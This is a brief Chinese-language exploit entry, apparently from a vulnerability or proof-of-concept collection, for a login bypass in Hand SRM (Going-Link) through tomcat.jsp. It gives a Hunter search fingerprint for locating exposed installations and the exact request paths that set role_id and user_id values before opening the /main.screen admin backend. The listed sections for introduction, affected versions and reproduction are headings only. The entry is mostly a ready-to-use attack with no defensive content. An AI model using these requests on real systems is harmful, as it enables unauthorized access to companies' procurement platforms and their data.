# 汉得SRMtomcat.jsp登录绕过漏洞

- **系统**：Tomcat　|　**类型**：其他　|　**CVE**：—
- **指纹**：`hunter：`app.name="汉得 SRM Going-Link"``

**请求体 / payload**
```
1. 访问`tomct.jsp`
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1

2. 然后访问后台`/main.screen`
```

**其他**
- 汉得SRM tomcat.jsp 登录绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 汉得 SRM云平台（Going-Link）